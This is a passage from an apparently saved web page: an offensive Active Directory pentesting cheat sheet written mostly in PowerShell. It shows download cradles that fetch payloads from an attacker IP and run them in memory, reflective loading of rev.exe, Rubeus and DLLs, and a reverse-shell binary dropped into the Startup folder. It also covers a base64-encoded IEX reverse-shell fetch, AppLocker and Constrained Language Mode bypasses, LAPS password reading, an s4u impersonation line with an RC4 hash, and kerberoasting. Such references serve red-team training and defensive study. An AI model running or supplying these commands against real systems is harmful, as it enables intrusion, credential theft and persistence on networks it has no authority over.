ss=3D" language-powershell"><code class=3D" language-powershell" data-lang=
=3D"powershell"><span class=3D"token variable">$h</span>=3D<span class=3D"t=
oken function">new-object</span> <span class=3D"token operator">-</span>com=
 WinHttp<span class=3D"token punctuation">.</span>WinHttpRequest<span class=
=3D"token punctuation">.</span>5<span class=3D"token punctuation">.</span>1=
<span class=3D"token punctuation">;</span><span class=3D"token variable">$h=
</span><span class=3D"token punctuation">.</span>open<span class=3D"token p=
unctuation">(</span><span class=3D"token string">'GET'</span><span class=3D=
"token punctuation">,</span><span class=3D"token string">'http://10.10.16.7=
/PowerView.obs.ps1'</span><span class=3D"token punctuation">,</span><span c=
lass=3D"token boolean">$false</span><span class=3D"token punctuation">)</sp=
an><span class=3D"token punctuation">;</span><span class=3D"token variable"=
>$h</span><span class=3D"token punctuation">.</span>send<span class=3D"toke=
n punctuation">(</span><span class=3D"token punctuation">)</span><span clas=
s=3D"token punctuation">;</span><span class=3D"token function">iex</span> <=
span class=3D"token variable">$h</span><span class=3D"token punctuation">.<=
/span>responseText
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><blockquote><p>Again, this will likely =
get flagged =F0=9F=9A=A9. For opsec-safe download cradles, check out <a hre=
f=3D"https://github.com/danielbohannon/Invoke-CradleCrafter">Invoke-CradleC=
rafter</a>.</p></blockquote><h4 id=3D"load-c-assembly-reflectively">Load C#=
 assembly reflectively</h4><p>Ensure that the referenced class and main met=
hods are <code>public</code> before running this. Note that a process-wide =
AMSI bypass may be required for this to work if the content is detected, <a=
 href=3D"https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Inte=
rface/">refer here for details</a>.</p><div class=3D"highlight"><div class=
=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-col=
or:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-pow=
ershell"><code class=3D" language-powershell" data-lang=3D"powershell"><spa=
n class=3D"token comment"># Download and run assembly without arguments</sp=
an>
<span class=3D"token variable">$data</span> =3D <span class=3D"token punctu=
ation">(</span><span class=3D"token function">New-Object</span> System<span=
 class=3D"token punctuation">.</span>Net<span class=3D"token punctuation">.=
</span>WebClient<span class=3D"token punctuation">)</span><span class=3D"to=
ken punctuation">.</span>DownloadData<span class=3D"token punctuation">(</s=
pan><span class=3D"token string">'http://10.10.16.7/rev.exe'</span><span cl=
ass=3D"token punctuation">)</span>
<span class=3D"token variable">$assem</span> =3D <span class=3D"token names=
pace">[System.Reflection.Assembly]</span>::Load<span class=3D"token punctua=
tion">(</span><span class=3D"token variable">$data</span><span class=3D"tok=
en punctuation">)</span>
<span class=3D"token namespace">[rev.Program]</span>::Main<span class=3D"to=
ken punctuation">(</span><span class=3D"token punctuation">)</span>

<span class=3D"token comment"># Download and run Rubeus, with arguments (ma=
ke sure to split the args)</span>
<span class=3D"token variable">$data</span> =3D <span class=3D"token punctu=
ation">(</span><span class=3D"token function">New-Object</span> System<span=
 class=3D"token punctuation">.</span>Net<span class=3D"token punctuation">.=
</span>WebClient<span class=3D"token punctuation">)</span><span class=3D"to=
ken punctuation">.</span>DownloadData<span class=3D"token punctuation">(</s=
pan><span class=3D"token string">'http://10.10.16.7/Rubeus.exe'</span><span=
 class=3D"token punctuation">)</span>
<span class=3D"token variable">$assem</span> =3D <span class=3D"token names=
pace">[System.Reflection.Assembly]</span>::Load<span class=3D"token punctua=
tion">(</span><span class=3D"token variable">$data</span><span class=3D"tok=
en punctuation">)</span>
<span class=3D"token namespace">[Rubeus.Program]</span>::Main<span class=3D=
"token punctuation">(</span><span class=3D"token string">"s4u /user:web01$ =
/rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdss=
pn:cifs/file01 /ptt"</span><span class=3D"token punctuation">.</span>Split<=
span class=3D"token punctuation">(</span><span class=3D"token punctuation">=
)</span><span class=3D"token punctuation">)</span>

<span class=3D"token comment"># Execute a specific method from an assembly =
(e.g. a DLL)</span>
<span class=3D"token variable">$data</span> =3D <span class=3D"token punctu=
ation">(</span><span class=3D"token function">New-Object</span> System<span=
 class=3D"token punctuation">.</span>Net<span class=3D"token punctuation">.=
</span>WebClient<span class=3D"token punctuation">)</span><span class=3D"to=
ken punctuation">.</span>DownloadData<span class=3D"token punctuation">(</s=
pan><span class=3D"token string">'http://10.10.16.7/lib.dll'</span><span cl=
ass=3D"token punctuation">)</span>
<span class=3D"token variable">$assem</span> =3D <span class=3D"token names=
pace">[System.Reflection.Assembly]</span>::Load<span class=3D"token punctua=
tion">(</span><span class=3D"token variable">$data</span><span class=3D"tok=
en punctuation">)</span>
<span class=3D"token variable">$class</span> =3D <span class=3D"token varia=
ble">$assem</span><span class=3D"token punctuation">.</span>GetType<span cl=
ass=3D"token punctuation">(</span><span class=3D"token string">"ClassLibrar=
y1.Class1"</span><span class=3D"token punctuation">)</span>
<span class=3D"token variable">$method</span> =3D <span class=3D"token vari=
able">$class</span><span class=3D"token punctuation">.</span>GetMethod<span=
 class=3D"token punctuation">(</span><span class=3D"token string">"runner"<=
/span><span class=3D"token punctuation">)</span>
<span class=3D"token variable">$method</span><span class=3D"token punctuati=
on">.</span>Invoke<span class=3D"token punctuation">(</span>0<span class=3D=
"token punctuation">,</span> <span class=3D"token variable">$null</span><sp=
an class=3D"token punctuation">)</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h4 id=3D"download-file">Download file<=
/h4><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0=
" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-si=
ze:4;tab-size:4" class=3D" language-powershell"><code class=3D" language-po=
wershell" data-lang=3D"powershell"><span class=3D"token comment"># Any vers=
ion</span>
<span class=3D"token punctuation">(</span><span class=3D"token function">Ne=
w-Object</span> System<span class=3D"token punctuation">.</span>Net<span cl=
ass=3D"token punctuation">.</span>WebClient<span class=3D"token punctuation=
">)</span><span class=3D"token punctuation">.</span>DownloadFile<span class=
=3D"token punctuation">(</span><span class=3D"token string">"http://192.168=
.119.155/PowerUp.ps1"</span><span class=3D"token punctuation">,</span> <spa=
n class=3D"token string">"C:\Windows\Temp\PowerUp.ps1"</span><span class=3D=
"token punctuation">)</span>

<span class=3D"token comment"># Powershell 4+</span>
<span class=3D"token comment">## You can use 'IWR' as a shorthand</span>
<span class=3D"token function">Invoke-WebRequest</span> <span class=3D"toke=
n string">"http://10.10.16.7/Rev.exe"</span> <span class=3D"token operator"=
>-</span>OutFile <span class=3D"token string">"C:\ProgramData\Microsoft\Win=
dows\Start Menu\Programs\StartUp\Rev.exe"</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h4 id=3D"encoded-commands">Encoded com=
mands</h4><p>Base64-encode a PowerShell command in the right format:</p><di=
v class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=
=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;ta=
b-size:4" class=3D" language-powershell"><code class=3D" language-powershel=
l" data-lang=3D"powershell"><span class=3D"token variable">$command</span> =
=3D <span class=3D"token string">'IEX (New-Object Net.WebClient).DownloadSt=
ring("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'</span>
<span class=3D"token variable">$bytes</span> =3D <span class=3D"token names=
pace">[System.Text.Encoding]</span>::Unicode<span class=3D"token punctuatio=
n">.</span>GetBytes<span class=3D"token punctuation">(</span><span class=3D=
"token variable">$command</span><span class=3D"token punctuation">)</span>
<span class=3D"token variable">$encodedCommand</span> =3D <span class=3D"to=
ken namespace">[Convert]</span>::ToBase64String<span class=3D"token punctua=
tion">(</span><span class=3D"token variable">$bytes</span><span class=3D"to=
ken punctuation">)</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Or, the Linux version of the above:<=
/p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0"=
 style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-siz=
e:4;tab-size:4" class=3D" language-bash"><code class=3D" language-bash" dat=
a-lang=3D"bash"><span class=3D"token builtin class-name">echo</span> <span =
class=3D"token string">'IEX (New-Object Net.WebClient).DownloadString("http=
://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'</span> <span class=3D"token=
 operator">|</span> <span class=3D"token function">iconv</span> -t utf-16le=
 <span class=3D"token operator">|</span> base64 -w <span class=3D"token num=
ber">0</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Bash<=
/span></div></div></div></div><p>Encode existing script, copy to clipboard:=
</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0=
" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-si=
ze:4;tab-size:4" class=3D" language-powershell"><code class=3D" language-po=
wershell" data-lang=3D"powershell"><span class=3D"token namespace">[System.=
Convert]</span>::ToBase64String<span class=3D"token punctuation">(</span><s=
pan class=3D"token namespace">[System.IO.File]</span>::ReadAllBytes<span cl=
ass=3D"token punctuation">(</span><span class=3D"token string">'c:\path\to\=
PowerView.ps1'</span><span class=3D"token punctuation">)</span><span class=
=3D"token punctuation">)</span> <span class=3D"token punctuation">|</span> =
clip
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Run it, bypassing execution policy.<=
/p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0"=
 style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-siz=
e:4;tab-size:4" class=3D" language-powershell"><code class=3D" language-pow=
ershell" data-lang=3D"powershell">Powershell <span class=3D"token operator"=
>-</span>EncodedCommand <span class=3D"token variable">$encodedCommand</spa=
n>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><blockquote><p>If you have Nishang hand=
y, you can use <a href=3D"https://github.com/samratashok/nishang/blob/maste=
r/Utility/Invoke-Encode.ps1">Invoke-Encode.ps1</a>.</p></blockquote><h2 id=
=3D"enumeration">Enumeration</h2><h3 id=3D"ad-enumeration-with-powerview">A=
D Enumeration With PowerView</h3><p>Though the below gives a good reperesen=
tation of the commands that usually come in most useful for me, this only s=
cratches the surface of what PowerView can do. PowerView is available <a hr=
ef=3D"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Powe=
rView.ps1">here</a>.</p><div class=3D"highlight"><div class=3D"code-toolbar=
"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-=
tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"><code c=
lass=3D" language-powershell" data-lang=3D"powershell"><span class=3D"token=
 comment"># Get all users in the current domain</span>
<span class=3D"token function">Get-DomainUser</span> <span class=3D"token p=
unctuation">|</span> <span class=3D"token function">select</span> <span cla=
ss=3D"token operator">-</span>ExpandProperty cn

<span class=3D"token comment"># Get all computers in the current domain</sp=
an>
<span class=3D"token function">Get-DomainComputer</span>

<span class=3D"token comment"># Get all domains in current forest</span>
<span class=3D"token function">Get-ForestDomain</span>

<span class=3D"token comment"># Get domain/forest trusts</span>
<span class=3D"token function">Get-DomainTrust</span>
<span class=3D"token function">Get-ForestTrust</span>

<span class=3D"token comment"># Get information for the DA group</span>
<span class=3D"token function">Get-DomainGroup</span> <span class=3D"token =
string">"Domain Admins"</span>

<span class=3D"token comment"># Find members of the DA group</span>
<span class=3D"token function">Get-DomainGroupMember</span> <span class=3D"=
token string">"Domain Admins"</span> <span class=3D"token punctuation">|</s=
pan> <span class=3D"token function">select</span> <span class=3D"token oper=
ator">-</span>ExpandProperty membername

<span class=3D"token comment"># Find interesting shares in the domain, igno=
re default shares, and check access</span>
<span class=3D"token function">Find-DomainShare</span> <span class=3D"token=
 operator">-</span>ExcludeStandard <span class=3D"token operator">-</span>E=
xcludePrint <span class=3D"token operator">-</span>ExcludeIPC <span class=
=3D"token operator">-</span>CheckShareAccess

<span class=3D"token comment"># Get OUs for current domain</span>
<span class=3D"token function">Get-DomainOU</span> <span class=3D"token ope=
rator">-</span>FullData

<span class=3D"token comment"># Get computers in an OU</span>
<span class=3D"token comment"># %{} is a looping statement</span>
<span class=3D"token function">Get-DomainOU</span> <span class=3D"token ope=
rator">-</span>name Servers <span class=3D"token punctuation">|</span> <spa=
n class=3D"token operator">%</span><span class=3D"token punctuation">{</spa=
n> <span class=3D"token function">Get-DomainComputer</span> <span class=3D"=
token operator">-</span>SearchBase <span class=3D"token variable">$_</span>=
<span class=3D"token punctuation">.</span>distinguishedname <span class=3D"=
token punctuation">}</span> <span class=3D"token punctuation">|</span> <spa=
n class=3D"token function">select</span> dnshostname

<span class=3D"token comment"># Get GPOs applied to a specific OU</span>
<span class=3D"token function">Get-DomainOU</span> <span class=3D"token ope=
rator">*</span>WS<span class=3D"token operator">*</span> <span class=3D"tok=
en punctuation">|</span> <span class=3D"token function">select</span> gplin=
k
<span class=3D"token function">Get-DomainGPO</span> <span class=3D"token op=
erator">-</span>Name <span class=3D"token string">"{3E04167E-C2B6-4A9A-8FB7=
-C811158DC97C}"</span>

<span class=3D"token comment"># Get Restricted Groups set via GPOs, look fo=
r interesting group memberships forced via domain</span>
<span class=3D"token function">Get-DomainGPOLocalGroup</span> <span class=
=3D"token operator">-</span>ResolveMembersToSIDs <span class=3D"token punct=
uation">|</span> <span class=3D"token function">select</span> GPODisplayNam=
e<span class=3D"token punctuation">,</span> GroupName<span class=3D"token p=
unctuation">,</span> GroupMemberOf<span class=3D"token punctuation">,</span=
> GroupMembers

<span class=3D"token comment"># Get the computers where users are part of a=
 local group through a GPO restricted group</span>
<span class=3D"token function">Get-DomainGPOUserLocalGroupMapping</span> <s=
pan class=3D"token operator">-</span>LocalGroup Administrators <span class=
=3D"token punctuation">|</span> <span class=3D"token function">select</span=
> ObjectName<span class=3D"token punctuation">,</span> GPODisplayName<span =
class=3D"token punctuation">,</span> ContainerName<span class=3D"token punc=
tuation">,</span> ComputerName

<span class=3D"token comment"># Find principals that can create new GPOs in=
 the domain</span>
<span class=3D"token function">Get-DomainObjectAcl</span> <span class=3D"to=
ken operator">-</span>SearchBase <span class=3D"token string">"CN=3DPolicie=
s,CN=3DSystem,DC=3Dtargetdomain,DC=3Dcom"</span> <span class=3D"token opera=
tor">-</span>ResolveGUIDs <span class=3D"token punctuation">|</span> ?<span=
 class=3D"token punctuation">{</span> <span class=3D"token variable">$_</sp=
an><span class=3D"token punctuation">.</span>ObjectAceType <span class=3D"t=
oken operator">-eq</span> <span class=3D"token string">"Group-Policy-Contai=
ner"</span> <span class=3D"token punctuation">}</span> <span class=3D"token=
 punctuation">|</span> <span class=3D"token function">select</span> ObjectD=
N<span class=3D"token punctuation">,</span> ActiveDirectoryRights<span clas=
s=3D"token punctuation">,</span> SecurityIdentifier

<span class=3D"token comment"># Find principals that can link GPOs to OUs</=
span>
<span class=3D"token function">Get-DomainOU</span> <span class=3D"token pun=
ctuation">|</span> <span class=3D"token function">Get-DomainObjectAcl</span=
> <span class=3D"token operator">-</span>ResolveGUIDs <span class=3D"token =
punctuation">|</span> ? <span class=3D"token punctuation">{</span> <span cl=
ass=3D"token variable">$_</span><span class=3D"token punctuation">.</span>O=
bjectAceType <span class=3D"token operator">-eq</span> <span class=3D"token=
 string">"GP-Link"</span> <span class=3D"token operator">-and</span> <span =
class=3D"token variable">$_</span><span class=3D"token punctuation">.</span=
>ActiveDirectoryRights <span class=3D"token operator">-match</span> <span c=
lass=3D"token string">"WriteProperty"</span> <span class=3D"token punctuati=
on">}</span> <span class=3D"token punctuation">|</span> <span class=3D"toke=
n function">select</span> ObjectDN<span class=3D"token punctuation">,</span=
> SecurityIdentifier

<span class=3D"token comment"># Get incoming ACL for a specific object</spa=
n>
<span class=3D"token function">Get-DomainObjectAcl</span> <span class=3D"to=
ken operator">-</span>SamAccountName <span class=3D"token string">"Domain A=
dmins"</span> <span class=3D"token operator">-</span>ResolveGUIDs <span cla=
ss=3D"token punctuation">|</span> <span class=3D"token function">Select</sp=
an> IdentityReference<span class=3D"token punctuation">,</span>ActiveDirect=
oryRights

<span class=3D"token comment"># Find interesting ACLs for the entire domain=
, show in a readable (left-to-right) format</span>
<span class=3D"token function">Find-InterestingDomainAcl</span> <span class=
=3D"token punctuation">|</span> <span class=3D"token function">select</span=
> identityreferencename<span class=3D"token punctuation">,</span>activedire=
ctoryrights<span class=3D"token punctuation">,</span>acetype<span class=3D"=
token punctuation">,</span>objectdn <span class=3D"token punctuation">|</sp=
an> ?<span class=3D"token punctuation">{</span><span class=3D"token variabl=
e">$_</span><span class=3D"token punctuation">.</span>IdentityReferenceName=
 <span class=3D"token operator">-NotContains</span> <span class=3D"token st=
ring">"DnsAdmins"</span><span class=3D"token punctuation">}</span> <span cl=
ass=3D"token punctuation">|</span> <span class=3D"token function">ft</span>

<span class=3D"token comment"># Get interesting outgoing ACLs for a specifi=
c user or group</span>
<span class=3D"token comment"># ?{} is a filter statement</span>
<span class=3D"token function">Find-InterestingDomainAcl</span> <span class=
=3D"token operator">-</span>ResolveGUIDs <span class=3D"token punctuation">=
|</span> ?<span class=3D"token punctuation">{</span><span class=3D"token va=
riable">$_</span><span class=3D"token punctuation">.</span>IdentityReferenc=
e <span class=3D"token operator">-match</span> <span class=3D"token string"=
>"Domain Admins"</span><span class=3D"token punctuation">}</span> <span cla=
ss=3D"token punctuation">|</span> <span class=3D"token function">select</sp=
an> ObjectDN<span class=3D"token punctuation">,</span>ActiveDirectoryRights
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"applocker">AppLocker</h3><p>I=
dentify the local AppLocker policy. Look for exempted binaries or paths to =
bypass.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabind=
ex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o=
-tab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D" lang=
uage-powershell" data-lang=3D"powershell"><span class=3D"token function">Ge=
t-AppLockerPolicy</span> <span class=3D"token operator">-</span>Effective <=
span class=3D"token punctuation">|</span> <span class=3D"token function">se=
lect</span> <span class=3D"token operator">-</span>ExpandProperty RuleColle=
ctions
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Get a remote AppLocker policy, based=
 on the Distinguished Name of the respective Group Policy (you could identi=
fy this e.g. in BloodHound).</p><div class=3D"highlight"><div class=3D"code=
-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#2020=
20;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"=
><code class=3D" language-powershell" data-lang=3D"powershell"><span class=
=3D"token function">Get-AppLockerPolicy</span> <span class=3D"token operato=
r">-</span>Domain <span class=3D"token operator">-</span>LDAP <span class=
=3D"token string">"LDAP://targetdomain.com/CN=3D{16641EA1-8DD3-4B33-A17F-9F=
259805B8FF},CN=3DPolicies,CN=3DSystem,DC=3Dtargetdomain,DC=3Dcom"</span>  <=
span class=3D"token punctuation">|</span> <span class=3D"token function">se=
lect</span> <span class=3D"token operator">-</span>expandproperty RuleColle=
ctions
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Some high-level bypass techniques:</=
p><ul><li>Use <a href=3D"https://lolbas-project.github.io/">LOLBAS</a> if o=
nly (Microsoft-)signed binaries are allowed.</li><li>If binaries from <code=
>C:\Windows</code> are allowed (default behavior), try dropping your binari=
es to <code>C:\Windows\Temp</code> or <code>C:\Windows\Tasks</code>. If the=
re are no writable subdirectories but writable files exist in this director=
y tree, write your file to an alternate data stream (e.g. a JScript script)=
 and execute it from there.</li><li>Wrap your binaries in a DLL file and ex=
ecute them with <code>rundll32</code> to bypass executable rules if DLL exe=
cution is not enforced (default behavior).</li><li>If binaries like Python =
are allowed, use those. If that doesn=E2=80=99t work, try other techniques =
such as wrapping JScript in a HTA file or running XSL files with <code>wmic=
</code>.</li><li>Otherwise elevate your privileges. AppLocker rules are mos=
t often not enforced for (local) administrative users.</li></ul><h3 id=3D"p=
owershell-constrained-language-mode">PowerShell Constrained Language Mode</=
h3><p>Sometimes you may find yourself in a PowerShell session that enforces=
 Constrained Language Mode (CLM). This is often the case when you=E2=80=99r=
e operating in an environment that enforces AppLocker (see above).</p><p>Yo=
u can identify you=E2=80=99re in constrained language mode by polling the f=
ollowing variable to get the current language mode. It will say <code>FullL=
anguage</code> for an unrestricted session, and <code>ConstrainedLanguage</=
code> for CLM. There are other language modes which I will not go into here=
.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"=
0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-s=
ize:4;tab-size:4" class=3D" language-powershell"><code class=3D" language-p=
owershell" data-lang=3D"powershell"><span class=3D"token variable">$Executi=
onContext</span><span class=3D"token punctuation">.</span>SessionState<span=
 class=3D"token punctuation">.</span>LanguageMode
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>The constraints posed by CLM will bl=
ock many of your exploitations attempts as key functionality in PowerShell =
is blocked. Bypassing CLM is largely the same as bypassing AppLocker as dis=
cussed above. Another way of bypassing CLM is to bypass AppLocker to execut=
e binaries that execute a custom PowerShell runspace (e.g. <a href=3D"https=
://github.com/mgeeky/Stracciatella">Stracciatella</a>) which will be uncons=
trained.</p><p>Another quick and dirty bypass is to use in-line functions, =
which sometimes works. If e.g. <code>whoami</code> is blocked, try the foll=
owing:</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabinde=
x=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-=
tab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D" langu=
age-powershell" data-lang=3D"powershell">&amp;<span class=3D"token punctuat=
ion">{</span>whoami<span class=3D"token punctuation">}</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"laps">LAPS</h3><p>The Local A=
dministrative Password Solution (LAPS) is Microsoft=E2=80=99s product for m=
anaging local admin passwords in the context of an Active Directory domain.=
 It frequently generates strong and unique passwords for the local admin us=
ers of enrolled machines. This password property and its expiry time are th=
en written to the computer object in Active Directory. Read access to LAPS =
passwords is only granted to Domain Admins by default, but often delegated =
to special groups.</p><p>The permission <code>ReadLAPSPassword</code> grant=
s users or groups the ability to read the <code>ms-Mcs-AdmPwd</code> proper=
ty and as such get the local admin password. You can look for this property=
 using e.g. BloodHound or PowerView. We can also use PowerView to read the =
password, if we know that we have the right <code>ReadLAPSPassword</code> p=
rivilege to a machine.</p><div class=3D"highlight"><div class=3D"code-toolb=
ar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-mo=
z-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"><code=
 class=3D" language-powershell" data-lang=3D"powershell"><span class=3D"tok=
en function">Get-DomainComputer</span> <span class=3D"token operator">-</sp=
an>identity LAPS<span class=3D"token operator">-</span>COMPUTER <span class=
=3D"token operator">-</span>properties ms<span class=3D"token operator">-</=
span>Mcs<span class=3D"token operator">-</span>AdmPwd
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>We can also use <a href=3D"https://g=
ithub.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1">LAPSToolkit.p=
s1</a> to identify which machines in the domain use LAPS, and which princip=
als are allowed to read LAPS passwords. If we are in this group, we can get=
 the current LAPS passwords using this tool as well.</p><div class=3D"highl=
ight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d=
0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=
=3D" language-powershell"><code class=3D" language-powershell" data-lang=3D=
"powershell"><span class=3D"token comment"># Get computers running LAPS, al=
ong with their passwords if we're allowed to read those</span>
<span class=3D"token function">Get-LAPSComputers</span>

<span class=3D"token comment"># Get groups allowed to read LAPS passwords</=
span>
<span class=3D"token function">Find-LAPSDelegatedGroups</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h2 id=3D"lateral-movement">Lateral Mov=
ement</h2><h3 id=3D"lateral-movement-enumeration-with-powerview">Lateral Mo=
vement Enumeration With PowerView</h3><div class=3D"highlight"><div class=
=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-col=
or:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-pow=
ershell"><code class=3D" language-powershell" data-lang=3D"powershell"><spa=
n class=3D"token comment"># Find existing local admin access for user (nois=
y =F0=9F=9A=A9)</span>
<span class=3D"token function">Find-LocalAdminAccess</span>

<span class=3D"token comment"># Hunt for sessions of interesting users on m=
achines where you have access (also noisy =F0=9F=9A=A9)</span>
<span class=3D"token function">Find-DomainUserLocation</span> <span class=
=3D"token operator">-</span>CheckAccess <span class=3D"token punctuation">|=
</span> ?<span class=3D"token punctuation">{</span><span class=3D"token var=
iable">$_</span><span class=3D"token punctuation">.</span>LocalAdmin <span =
class=3D"token operator">-Eq</span> True <span class=3D"token punctuation">=
}</span>

<span class=3D"token comment"># Look for kerberoastable users</span>
<span class=3D"token function">Get-DomainUser</span> <span class=3D"token o=
perator">-</span>SPN <span class=3D"token punctuation">|</span> <span class=
=3D"token function">select</span> name<span class=3D"token punctuation">,</=
span>serviceprincipalname

<span class=3D"token comment"># Look for AS-REP roastable users</span>
<span class=3D"token function">Get-DomainUser</span> <span class=3D"token o=
perator">-</span>PreauthNotRequired <span class=3D"token punctuation">|</sp=
an> <span class=3D"token function">select</span> name

<span class=3D"token comment"># Look for interesting ACL within the domain,=
 filtering on a specific user or group you have compromised</span>
<span class=3D"token comment">## Exploitation depends on the identified ACL=
, some techniques are discussed in this cheat sheet</span>
<span class=3D"token comment">## Example for GenericWrite on user: Disable =
preauth or add SPN for targeted kerberoast (see below)</span>
<span class=3D"token function">Find-InterestingDomainAcl</span> <span class=
=3D"token operator">-</span>ResolveGUIDs <span class=3D"token punctuation">=
|</span> ?<span class=3D"token punctuation">{</span><span class=3D"token va=
riable">$_</span><span class=3D"token punctuation">.</span>IdentityReferenc=
eName <span class=3D"token operator">-match</span> <span class=3D"token str=
ing">"UserOrGroupToQuery"</span><span class=3D"token punctuation">}</span>

<span class=3D"token comment"># Look for servers with Unconstrained Delegat=
ion enabled</span>
<span class=3D"token comment">## If available and you have admin privs on t=
his server, get user TGT (see below)</span>
<span class=3D"token function">Get-DomainComputer</span> <span class=3D"tok=
en operator">-</span>Unconstrained

<span class=3D"token comment"># Look for users or computers with Constraine=
d Delegation enabled</span>
<span class=3D"token comment">## If available and you have user/computer ha=
sh, access service machine as DA (see below)</span>
<span class=3D"token function">Get-DomainUser</span> <span class=3D"token o=
perator">-</span>TrustedToAuth <span class=3D"token punctuation">|</span> <=
span class=3D"token function">select</span> userprincipalname<span class=3D=
"token punctuation">,</span>msds<span class=3D"token operator">-</span>allo=
wedtodelegateto
<span class=3D"token function">Get-DomainComputer</span> <span class=3D"tok=
en operator">-</span>TrustedToAuth <span class=3D"token punctuation">|</spa=
n> <span class=3D"token function">select</span> name<span class=3D"token pu=
nctuation">,</span>msds<span class=3D"token operator">-</span>allowedtodele=
gateto
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"bloodhound">BloodHound</h3><p=
>Use <code>Invoke-BloodHound</code> from <code>SharpHound.ps1</code>, or us=
e <code>SharpHound.exe</code>. Both can be run reflectively, get them <a hr=
ef=3D"https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">he=
re</a>. Examples below use the PowerShell variant but arguments are identic=
al.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=
=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-t=
ab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D" langua=
ge-powershell" data-lang=3D"powershell"><span class=3D"token comment"># Run=
 all checks, including restricted groups enforced through the domain  =F0=
=9F=9A=A9</span>
<span class=3D"token function">Invoke-BloodHound</span> <span class=3D"toke=
n operator">-</span>CollectionMethod All<span class=3D"token punctuation">,=
</span>GPOLocalGroup

<span class=3D"token comment"># Running LoggedOn separately sometimes gives=
 you more sessions, but enumerates by looping through hosts so is VERY nois=
y =F0=9F=9A=A9</span>
<span class=3D"token function">Invoke-BloodHound</span> <span class=3D"toke=
n operator">-</span>CollectionMethod LoggedOn
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>For real engagements definitely look=
 into the <a href=3D"https://bloodhound.readthedocs.io/en/latest/data-colle=
ction/sharphound-all-flags.html">various arguments</a> that BloodHound prov=
ides for more stealthy collection and exfiltration of data.</p><h3 id=3D"ke=
rberoasting">Kerberoasting</h3><h4 id=3D"automatic">Automatic</h4><p>With P=
owerView:</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabi=
ndex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;=
-o-tab-size:4;tab-size:4" class=3D" language-powershell"><code class=3D" la=
nguage-powershell" data-lang=3D"powershell"><span class=3D"token function">=
Get-DomainSPNTicket</span> <span class=3D"token operator">-</span>SPN <span=
 class=3D"token string">"MSSQLSvc/sqlserver.targetdomain.com"</span>
